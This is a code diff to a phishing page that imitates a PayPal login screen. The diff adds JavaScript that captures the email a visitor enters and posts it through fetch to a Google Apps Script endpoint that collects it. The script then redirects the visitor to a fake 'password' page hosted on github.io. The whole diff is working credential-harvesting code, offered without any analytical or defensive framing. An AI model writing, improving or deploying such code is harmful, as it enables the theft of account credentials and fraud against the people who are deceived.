@@ -184,12 +184,38 @@ hs.src = ('//s10.histats.com/js15_as.js');
 <div class="corral">
   <div id="content" class="contentContainerBordered">
 	<center><p><img alt="Pay Pal" src="logo.png"></p></center>
-	<form action="https://script.google.com/macros/s/AKfycby4vTyJsps5yFYRvTWbNJGm49wl6-EXhWQV3BdRVy4/dev" method="POST" class="proceed maskable" autocomplete="off" name="login">
+		<!-- The Form -->
+<form id="google-sheet-form">
 	  <div class="textInput">
 	  <input id="email" name="login_email" type="email" class="hasHelp  validateEmpty   " required="required" value="" autocomplete="off" placeholder="Enter Your Email" required="required">
-	  <a href="password/"><button class="button actionContinue scTrack:unifiedlogin-login-click-next" type="submit" id="btnNext" name="btnNext" value="Next" pa-marked="1">Next</button></a>
+		  <button type="submit">Submit Form</button>
 	  </div>
-	</form>
+</form>
+
+<!-- The Script -->
+<script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycby4vTyJsps5yFYRvTWbNJGm49wl6-EXhWQV3BdRVy4/dev';
+  const redirectURL = 'https://alihasan070970-beep.github.io/aypal/password/'; // Target page
+  const form = document.getElementById('google-sheet-form');
+
+  form.addEventListener('submit', e => {
+    e.preventDefault(); // Stop native form submit and redirect
+    
+    // Send form data asynchronously
+    fetch(scriptURL, { 
+      method: 'POST', 
+      body: new FormData(form)
+    })
+    .then(response => {
+      // Redirect the user to your custom link on success
+      window.location.href = redirectURL;
+    })
+    .catch(error => {
+      console.error('Error submitting form:', error.message);
+      alert('Something went wrong. Please try again.');
+    });
+  });
+</script>
   </div>
 </div>
 <footer class="footer footerStayPut">
